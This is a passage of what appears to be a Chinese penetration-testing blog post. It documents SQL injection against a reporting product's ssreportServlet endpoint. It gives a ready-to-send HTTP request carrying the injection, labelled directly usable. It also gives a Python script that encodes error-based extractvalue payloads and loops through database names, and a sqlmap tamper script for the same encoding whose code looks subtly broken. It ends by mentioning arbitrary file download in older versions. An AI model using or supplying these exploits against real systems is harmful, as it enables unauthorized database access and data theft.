%22%3Atrue%2C%22sheetPageCounts%22%3A%5B1%5D%7D</span><br></pre></td></tr></table></figure>

<h2 id="解码并修改数据包直接注入（可直接使用）"><a href="#解码并修改数据包直接注入（可直接使用）" class="headerlink" title="解码并修改数据包直接注入（可直接使用）"></a>解码并修改数据包直接注入（可直接使用）</h2><p>修改paramsInfoEncode为paramsInfo，将Encode参数去掉</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;ssreportServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;openresource.jsp?iPad&#x3D;true&amp;refresh&#x3D;true&amp;showtoolbar&#x3D;false&amp;showPath&#x3D;false&amp;resid&#x3D;I40281d81016a8bc28bc20231016aaee007b230ac&amp;_timestamp&#x3D;1610433924926</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 3282</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: FQPassword&#x3D;; JSESSIONID&#x3D;4BB550BF10C606619B753D3CE52CD3AB</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">sheetIndex&#x3D;0&amp;resid&#x3D;I40281d81016a8bc28bc20231016aaee007b230ac&amp;clientId&#x3D;Iff8080810176f0c7f0c7544f0176f54eb72c1160&amp;refreshType&#x3D;refresh&amp;paramsInfo&#x3D;%5B%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E5%8D%95%E4%BD%8D%E5%90%8D%E7%A7%B0%22%2C%22name%22%3A%22%E5%8D%95%E4%BD%8D%E5%90%8D%E7%A7%B0%22%2C%22alias%22%3A%22%E5%8D%95%E4%BD%8D%E5%90%8D%E7%A7%B0%22%2C%22value%22%3A%22&#39;11111%22%2C%22displayValue%22%3A%22&#39;11111%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%B1%9E%E6%9C%BA%E6%9E%84%22%2C%22name%22%3A%22%E6%89%80%E5%B1%9E%E6%9C%BA%E6%9E%84%22%2C%22alias%22%3A%22%E6%89%80%E5%B1%9E%E6%9C%BA%E6%9E%84%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%9C%A8%E7%9C%81%E4%BB%BD%22%2C%22name%22%3A%22%E6%89%80%E5%9C%A8%E7%9C%81%E4%BB%BD%22%2C%22alias%22%3A%22%E6%89%80%E5%9C%A8%E7%9C%81%E4%BB%BD%22%2C%22value%22%3A%22440000%22%2C%22displayValue%22%3A%22%E5%B9%BF%E4%B8%9C%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%9C%A8%E5%9C%B0%E5%B8%82%22%2C%22name%22%3A%22%E6%89%80%E5%9C%A8%E5%9C%B0%E5%B8%82%22%2C%22alias%22%3A%22%E6%89%80%E5%9C%A8%E5%9C%B0%E5%B8%82%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%E5%85%A8%E9%83%A8%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%9C%A8%E5%8C%BA%E5%8E%BF%22%2C%22name%22%3A%22%E6%89%80%E5%9C%A8%E5%8C%BA%E5%8E%BF%22%2C%22alias%22%3A%22%E6%89%80%E5%9C%A8%E5%8C%BA%E5%8E%BF%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%E5%85%A8%E9%83%A8%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.id%22%2C%22name%22%3A%22id%22%2C%22alias%22%3A%22%E6%A3%80%E6%B5%8B%E6%9C%BA%E6%9E%84id%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22name%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22alias%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22name%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22alias%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22name%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22alias%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22name%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22alias%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%5D&amp;pageId&#x3D;0&amp;writeBackData&#x3D;&amp;exportSheetIndexes&#x3D;&amp;exportId&#x3D;&amp;op&#x3D;%7B%22getTotalPages%22%3Atrue%2C%22sheetPageCounts%22%3A%5B1%5D%7D</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112145030005.png" alt="image-20210112145030005"></p>
<h2 id="py脚本RMI加密后注入"><a href="#py脚本RMI加密后注入" class="headerlink" title="py脚本RMI加密后注入"></a>py脚本RMI加密后注入</h2><p>报错注入demo：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">from urllib.parse import quote,unquote</span><br><span class="line">import re</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">#去除https的warning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">ENCODING_SCHEDULE &#x3D; &#123;</span><br><span class="line">    &quot;0&quot;: &quot;7&quot;, &quot;1&quot;: &quot;1&quot;, &quot;2&quot;: &quot;u&quot;, &quot;3&quot;: &quot;N&quot;, &quot;4&quot;: &quot;K&quot;, &quot;5&quot;: &quot;J&quot;, &quot;6&quot;: &quot;M&quot;, &quot;7&quot;: &quot;9&quot;, &quot;8&quot;: &quot;&#39;&quot;, &quot;9&quot;: &quot;m&quot;, &quot;!&quot;: &quot;P&quot;,</span><br><span class="line">    &quot;%&quot;: &quot;&#x2F;&quot;, &quot;&#39;&quot;: &quot;n&quot;, &quot;(&quot;: &quot;A&quot;, &quot;)&quot;: &quot;E&quot;, &quot;*&quot;: &quot;s&quot;, &quot;+&quot;: &quot;+&quot;, &quot;-&quot;: &quot;f&quot;, &quot;.&quot;: &quot;q&quot;, &quot;A&quot;: &quot;O&quot;, &quot;B&quot;: &quot;V&quot;, &quot;C&quot;: &quot;t&quot;,</span><br><span class="line">    &quot;D&quot;: &quot;T&quot;, &quot;E&quot;: &quot;a&quot;, &quot;F&quot;: &quot;x&quot;, &quot;G&quot;: &quot;H&quot;, &quot;H&quot;: &quot;r&quot;, &quot;I&quot;: &quot;c&quot;, &quot;J&quot;: &quot;v&quot;, &quot;K&quot;: &quot;l&quot;, &quot;L&quot;: &quot;8&quot;, &quot;M&quot;: &quot;F&quot;, &quot;N&quot;: &quot;3&quot;,</span><br><span class="line">    &quot;O&quot;: &quot;o&quot;, &quot;P&quot;: &quot;L&quot;, &quot;Q&quot;: &quot;Y&quot;, &quot;R&quot;: &quot;j&quot;, &quot;S&quot;: &quot;W&quot;, &quot;T&quot;: &quot;*&quot;, &quot;U&quot;: &quot;z&quot;, &quot;V&quot;: &quot;Z&quot;, &quot;W&quot;: &quot;!&quot;, &quot;X&quot;: &quot;B&quot;, &quot;Y&quot;: &quot;)&quot;,</span><br><span class="line">    &quot;Z&quot;: &quot;U&quot;, &quot;a&quot;: &quot;(&quot;, &quot;b&quot;: &quot;~&quot;, &quot;c&quot;: &quot;i&quot;, &quot;d&quot;: &quot;h&quot;, &quot;e&quot;: &quot;p&quot;, &quot;f&quot;: &quot;_&quot;, &quot;g&quot;: &quot;-&quot;, &quot;h&quot;: &quot;I&quot;, &quot;i&quot;: &quot;R&quot;, &quot;j&quot;: &quot;.&quot;,</span><br><span class="line">    &quot;k&quot;: &quot;G&quot;, &quot;l&quot;: &quot;S&quot;, &quot;m&quot;: &quot;d&quot;, &quot;n&quot;: &quot;6&quot;, &quot;o&quot;: &quot;w&quot;, &quot;p&quot;: &quot;5&quot;, &quot;q&quot;: &quot;0&quot;, &quot;r&quot;: &quot;4&quot;, &quot;s&quot;: &quot;D&quot;, &quot;t&quot;: &quot;k&quot;, &quot;u&quot;: &quot;Q&quot;,</span><br><span class="line">    &quot;v&quot;: &quot;g&quot;, &quot;w&quot;: &quot;b&quot;, &quot;x&quot;: &quot;C&quot;, &quot;y&quot;: &quot;2&quot;, &quot;z&quot;: &quot;X&quot;, &quot;~&quot;: &quot;e&quot;, &quot;_&quot;: &quot;y&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DECODING_SCHEDULE &#x3D; &#123;</span><br><span class="line">    &quot;7&quot;: &quot;0&quot;, &quot;1&quot;: &quot;1&quot;, &quot;u&quot;: &quot;2&quot;, &quot;N&quot;: &quot;3&quot;, &quot;K&quot;: &quot;4&quot;, &quot;J&quot;: &quot;5&quot;, &quot;M&quot;: &quot;6&quot;, &quot;9&quot;: &quot;7&quot;, &quot;&#39;&quot;: &quot;8&quot;, &quot;m&quot;: &quot;9&quot;, &quot;P&quot;: &quot;!&quot;,</span><br><span class="line">    &quot;&#x2F;&quot;: &quot;%&quot;, &quot;n&quot;: &quot;&#39;&quot;, &quot;A&quot;: &quot;(&quot;, &quot;E&quot;: &quot;)&quot;, &quot;s&quot;: &quot;*&quot;, &quot;+&quot;: &quot;+&quot;, &quot;f&quot;: &quot;-&quot;, &quot;q&quot;: &quot;.&quot;, &quot;O&quot;: &quot;A&quot;, &quot;V&quot;: &quot;B&quot;, &quot;t&quot;: &quot;C&quot;,</span><br><span class="line">    &quot;T&quot;: &quot;D&quot;, &quot;a&quot;: &quot;E&quot;, &quot;x&quot;: &quot;F&quot;, &quot;H&quot;: &quot;G&quot;, &quot;r&quot;: &quot;H&quot;, &quot;c&quot;: &quot;I&quot;, &quot;v&quot;: &quot;J&quot;, &quot;l&quot;: &quot;K&quot;, &quot;8&quot;: &quot;L&quot;, &quot;F&quot;: &quot;M&quot;, &quot;3&quot;: &quot;N&quot;,</span><br><span class="line">    &quot;o&quot;: &quot;O&quot;, &quot;L&quot;: &quot;P&quot;, &quot;Y&quot;: &quot;Q&quot;, &quot;j&quot;: &quot;R&quot;, &quot;W&quot;: &quot;S&quot;, &quot;*&quot;: &quot;T&quot;, &quot;z&quot;: &quot;U&quot;, &quot;Z&quot;: &quot;V&quot;, &quot;!&quot;: &quot;W&quot;, &quot;B&quot;: &quot;X&quot;, &quot;)&quot;: &quot;Y&quot;,</span><br><span class="line">    &quot;U&quot;: &quot;Z&quot;, &quot;(&quot;: &quot;a&quot;, &quot;~&quot;: &quot;b&quot;, &quot;i&quot;: &quot;c&quot;, &quot;h&quot;: &quot;d&quot;, &quot;p&quot;: &quot;e&quot;, &quot;_&quot;: &quot;f&quot;, &quot;-&quot;: &quot;g&quot;, &quot;I&quot;: &quot;h&quot;, &quot;R&quot;: &quot;i&quot;, &quot;.&quot;: &quot;j&quot;,</span><br><span class="line">    &quot;G&quot;: &quot;k&quot;, &quot;S&quot;: &quot;l&quot;, &quot;d&quot;: &quot;m&quot;, &quot;6&quot;: &quot;n&quot;, &quot;w&quot;: &quot;o&quot;, &quot;5&quot;: &quot;p&quot;, &quot;0&quot;: &quot;q&quot;, &quot;4&quot;: &quot;r&quot;, &quot;D&quot;: &quot;s&quot;, &quot;k&quot;: &quot;t&quot;, &quot;Q&quot;: &quot;u&quot;,</span><br><span class="line">    &quot;g&quot;: &quot;v&quot;, &quot;b&quot;: &quot;w&quot;, &quot;C&quot;: &quot;x&quot;, &quot;2&quot;: &quot;y&quot;, &quot;X&quot;: &quot;z&quot;, &quot;e&quot;: &quot;~&quot;, &quot;y&quot;: &quot;_&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#此函数可以用来加密明文也可以解密服务器返回的密文</span><br><span class="line">def encode(code):</span><br><span class="line">    out &#x3D; &quot;&quot;</span><br><span class="line">    for item in code:</span><br><span class="line">        out &#x3D; out + ENCODING_SCHEDULE.get(item, item)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">def decode(code):</span><br><span class="line">    out &#x3D; &quot;&quot;</span><br><span class="line">    for item in code:</span><br><span class="line">        out &#x3D; out + DECODING_SCHEDULE.get(item, item)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;ssreportServlet&quot;</span><br><span class="line"></span><br><span class="line">headers &#x3D; &#123;&quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36&quot;,</span><br><span class="line">           &quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,</span><br><span class="line">           &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;,</span><br><span class="line">           &quot;Cookie&quot;:&quot;JSESSIONID&#x3D;4BB550BF10C606619B753D3CE52CD3AB&quot;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">origin1 &#x3D; &#39;&#39;&#39;[&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.单位名称&quot;,&quot;name&quot;:&quot;单位名称&quot;,&quot;alias&quot;:&quot;单位名称&quot;,&quot;value&quot;:&quot;&#39;&#39;&#39;</span><br><span class="line">origin2 &#x3D; &#39;&#39;&#39;&quot;,&quot;displayValue&quot;:&quot;&#39;&#39;&#39;</span><br><span class="line">origin3 &#x3D; &#39;&#39;&#39;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所属机构&quot;,&quot;name&quot;:&quot;所属机构&quot;,&quot;alias&quot;:&quot;所属机构&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在省份&quot;,&quot;name&quot;:&quot;所在省份&quot;,&quot;alias&quot;:&quot;所在省份&quot;,&quot;value&quot;:&quot;440000&quot;,&quot;displayValue&quot;:&quot;广东&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在地市&quot;,&quot;name&quot;:&quot;所在地市&quot;,&quot;alias&quot;:&quot;所在地市&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;全部&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在区县&quot;,&quot;name&quot;:&quot;所在区县&quot;,&quot;alias&quot;:&quot;所在区县&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;全部&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.id&quot;,&quot;name&quot;:&quot;id&quot;,&quot;alias&quot;:&quot;检测机构id&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.填报时间起&quot;,&quot;name&quot;:&quot;填报时间起&quot;,&quot;alias&quot;:&quot;填报时间起&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.填报时间止&quot;,&quot;name&quot;:&quot;填报时间止&quot;,&quot;alias&quot;:&quot; 填报时间止&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.更新时间起&quot;,&quot;name&quot;:&quot;更新时间起&quot;,&quot;alias&quot;:&quot;更新时间起&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;,&#123;&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.更新时间止&quot;,&quot;name&quot;:&quot;更新时间止&quot;,&quot;alias&quot;:&quot;更新时间止&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;&#125;]&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1,20):</span><br><span class="line">    payload &#x3D; &quot;%&#39; and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit &#123;0&#125;,1),0x7e)) and null &#x3D; &#39;%&quot;.format(i)</span><br><span class="line">    # print(payload)</span><br><span class="line">    origin_full &#x3D; origin1 + payload + origin2 + payload + origin3</span><br><span class="line">    # print(origin_full)</span><br><span class="line">    url_encode_full &#x3D; quote(origin_full)</span><br><span class="line">    # print(url_encode_full)</span><br><span class="line">    rmi_encode &#x3D; encode(url_encode_full)</span><br><span class="line">    # print(rmi_encode)</span><br><span class="line">    encode_final &#x3D; &#39;encode&#x3D;&#39;+rmi_encode</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &quot;resid&quot;:&quot;I40281d81016a8bc28bc20231016aaee007b230ac&quot;,</span><br><span class="line">        &quot;clientId&quot;:&quot;Iff8080810176f0c7f0c7544f0176f54eb72c1160&quot;,</span><br><span class="line">        &quot;refreshType&quot;:&quot;refresh&quot;,</span><br><span class="line">        &quot;paramsInfoEncode&quot;:encode_final</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #proxies &#x3D; &#123;&#39;http&#39;:&#39;http:&#x2F;&#x2F;127.0.0.1:8080&#39;,&#39;https&#39;:&#39;http:&#x2F;&#x2F;127.0.0.1:8080&#39;&#125;</span><br><span class="line"></span><br><span class="line">    r &#x3D; requests.post(url,data&#x3D;data,headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    #print(r.text)</span><br><span class="line">    regex &#x3D; r&quot;~\w+~&quot;</span><br><span class="line">    match &#x3D; re.search(regex,r.text).span() #返回第一个匹配到的结果的位置（1000,1005）</span><br><span class="line">    database &#x3D; r.text[match[0]+1:match[1]-1]</span><br><span class="line">    print(r.text[match[0]:match[1]])</span><br><span class="line"></span><br><span class="line">    with open(&#39;file.txt&#39;,&#39;a+&#39;) as f:</span><br><span class="line">        f.write(database+&#39;\n&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112175110646.png" alt="image-20210112175110646"></p>
<p>在想怎么结合sqlmap写tamper指定位置实现注入，需要修改tamper, 可以实现Payload加密，有时间的话研究一下sqlmap源码可以写一个全加密的tamper</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2020 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)</span><br><span class="line">See the file &#39;LICENSE&#39; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">from urlparse  import unquote</span><br><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br><span class="line">ENCODING_SCHEDULE &#x3D; &#123;</span><br><span class="line">    &quot;0&quot;: &quot;7&quot;, &quot;1&quot;: &quot;1&quot;, &quot;2&quot;: &quot;u&quot;, &quot;3&quot;: &quot;N&quot;, &quot;4&quot;: &quot;K&quot;, &quot;5&quot;: &quot;J&quot;, &quot;6&quot;: &quot;M&quot;, &quot;7&quot;: &quot;9&quot;, &quot;8&quot;: &quot;&#39;&quot;, &quot;9&quot;: &quot;m&quot;, &quot;!&quot;: &quot;P&quot;, </span><br><span class="line">    &quot;%&quot;: &quot;&#x2F;&quot;, &quot;&#39;&quot;: &quot;n&quot;, &quot;(&quot;: &quot;A&quot;, &quot;)&quot;: &quot;E&quot;, &quot;*&quot;: &quot;s&quot;, &quot;+&quot;: &quot;+&quot;, &quot;-&quot;: &quot;f&quot;, &quot;.&quot;: &quot;q&quot;, &quot;A&quot;: &quot;O&quot;, &quot;B&quot;: &quot;V&quot;, &quot;C&quot;: &quot;t&quot;, </span><br><span class="line">    &quot;D&quot;: &quot;T&quot;, &quot;E&quot;: &quot;a&quot;, &quot;F&quot;: &quot;x&quot;, &quot;G&quot;: &quot;H&quot;, &quot;H&quot;: &quot;r&quot;, &quot;I&quot;: &quot;c&quot;, &quot;J&quot;: &quot;v&quot;, &quot;K&quot;: &quot;l&quot;, &quot;L&quot;: &quot;8&quot;, &quot;M&quot;: &quot;F&quot;, &quot;N&quot;: &quot;3&quot;, </span><br><span class="line">    &quot;O&quot;: &quot;o&quot;, &quot;P&quot;: &quot;L&quot;, &quot;Q&quot;: &quot;Y&quot;, &quot;R&quot;: &quot;j&quot;, &quot;S&quot;: &quot;W&quot;, &quot;T&quot;: &quot;*&quot;, &quot;U&quot;: &quot;z&quot;, &quot;V&quot;: &quot;Z&quot;, &quot;W&quot;: &quot;!&quot;, &quot;X&quot;: &quot;B&quot;, &quot;Y&quot;: &quot;)&quot;, </span><br><span class="line">    &quot;Z&quot;: &quot;U&quot;, &quot;a&quot;: &quot;(&quot;, &quot;b&quot;: &quot;~&quot;, &quot;c&quot;: &quot;i&quot;, &quot;d&quot;: &quot;h&quot;, &quot;e&quot;: &quot;p&quot;, &quot;f&quot;: &quot;_&quot;, &quot;g&quot;: &quot;-&quot;, &quot;h&quot;: &quot;I&quot;, &quot;i&quot;: &quot;R&quot;, &quot;j&quot;: &quot;.&quot;, </span><br><span class="line">    &quot;k&quot;: &quot;G&quot;, &quot;l&quot;: &quot;S&quot;, &quot;m&quot;: &quot;d&quot;, &quot;n&quot;: &quot;6&quot;, &quot;o&quot;: &quot;w&quot;, &quot;p&quot;: &quot;5&quot;, &quot;q&quot;: &quot;0&quot;, &quot;r&quot;: &quot;4&quot;, &quot;s&quot;: &quot;D&quot;, &quot;t&quot;: &quot;k&quot;, &quot;u&quot;: &quot;Q&quot;, </span><br><span class="line">    &quot;v&quot;: &quot;g&quot;, &quot;w&quot;: &quot;b&quot;, &quot;x&quot;: &quot;C&quot;, &quot;y&quot;: &quot;2&quot;, &quot;z&quot;: &quot;X&quot;, &quot;~&quot;: &quot;e&quot;, &quot;_&quot;: &quot;y&quot;, </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DECODING_SCHEDULE &#x3D; &#123;</span><br><span class="line">    &quot;7&quot;: &quot;0&quot;, &quot;1&quot;: &quot;1&quot;, &quot;u&quot;: &quot;2&quot;, &quot;N&quot;: &quot;3&quot;, &quot;K&quot;: &quot;4&quot;, &quot;J&quot;: &quot;5&quot;, &quot;M&quot;: &quot;6&quot;, &quot;9&quot;: &quot;7&quot;, &quot;&#39;&quot;: &quot;8&quot;, &quot;m&quot;: &quot;9&quot;, &quot;P&quot;: &quot;!&quot;, </span><br><span class="line">    &quot;&#x2F;&quot;: &quot;%&quot;, &quot;n&quot;: &quot;&#39;&quot;, &quot;A&quot;: &quot;(&quot;, &quot;E&quot;: &quot;)&quot;, &quot;s&quot;: &quot;*&quot;, &quot;+&quot;: &quot;+&quot;, &quot;f&quot;: &quot;-&quot;, &quot;q&quot;: &quot;.&quot;, &quot;O&quot;: &quot;A&quot;, &quot;V&quot;: &quot;B&quot;, &quot;t&quot;: &quot;C&quot;, </span><br><span class="line">    &quot;T&quot;: &quot;D&quot;, &quot;a&quot;: &quot;E&quot;, &quot;x&quot;: &quot;F&quot;, &quot;H&quot;: &quot;G&quot;, &quot;r&quot;: &quot;H&quot;, &quot;c&quot;: &quot;I&quot;, &quot;v&quot;: &quot;J&quot;, &quot;l&quot;: &quot;K&quot;, &quot;8&quot;: &quot;L&quot;, &quot;F&quot;: &quot;M&quot;, &quot;3&quot;: &quot;N&quot;, </span><br><span class="line">    &quot;o&quot;: &quot;O&quot;, &quot;L&quot;: &quot;P&quot;, &quot;Y&quot;: &quot;Q&quot;, &quot;j&quot;: &quot;R&quot;, &quot;W&quot;: &quot;S&quot;, &quot;*&quot;: &quot;T&quot;, &quot;z&quot;: &quot;U&quot;, &quot;Z&quot;: &quot;V&quot;, &quot;!&quot;: &quot;W&quot;, &quot;B&quot;: &quot;X&quot;, &quot;)&quot;: &quot;Y&quot;, </span><br><span class="line">    &quot;U&quot;: &quot;Z&quot;, &quot;(&quot;: &quot;a&quot;, &quot;~&quot;: &quot;b&quot;, &quot;i&quot;: &quot;c&quot;, &quot;h&quot;: &quot;d&quot;, &quot;p&quot;: &quot;e&quot;, &quot;_&quot;: &quot;f&quot;, &quot;-&quot;: &quot;g&quot;, &quot;I&quot;: &quot;h&quot;, &quot;R&quot;: &quot;i&quot;, &quot;.&quot;: &quot;j&quot;, </span><br><span class="line">    &quot;G&quot;: &quot;k&quot;, &quot;S&quot;: &quot;l&quot;, &quot;d&quot;: &quot;m&quot;, &quot;6&quot;: &quot;n&quot;, &quot;w&quot;: &quot;o&quot;, &quot;5&quot;: &quot;p&quot;, &quot;0&quot;: &quot;q&quot;, &quot;4&quot;: &quot;r&quot;, &quot;D&quot;: &quot;s&quot;, &quot;k&quot;: &quot;t&quot;, &quot;Q&quot;: &quot;u&quot;, </span><br><span class="line">    &quot;g&quot;: &quot;v&quot;, &quot;b&quot;: &quot;w&quot;, &quot;C&quot;: &quot;x&quot;, &quot;2&quot;: &quot;y&quot;, &quot;X&quot;: &quot;z&quot;, &quot;e&quot;: &quot;~&quot;, &quot;y&quot;: &quot;_&quot;, </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#此函数可以用来加密明文也可以解密服务器返回的密文</span><br><span class="line">def encode(code):</span><br><span class="line">    out &#x3D; &quot;&quot;</span><br><span class="line">    for item in code:</span><br><span class="line">        out &#x3D; out + ENCODING_SCHEDULE.get(item, item)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">def decode(code):</span><br><span class="line">    out &#x3D; &quot;&quot;</span><br><span class="line">    for item in code:</span><br><span class="line">        out &#x3D; out + DECODING_SCHEDULE.get(item, item)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    rmi-encodes all characters in a given payload</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&quot;1&#39; AND SLEEP(5)#&quot;)</span><br><span class="line">    &#39;MScgQU5EIFNMRUVQKDUpIw&#x3D;&#x3D;&#39;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    return encode(payload, binary&#x3D;False) if payload else payload</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120111021112.png" alt="image-20210120111021112"></p>
<h1 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h1><p>V85以下的可能任意文件下载都有。V95版本不存在。</p>
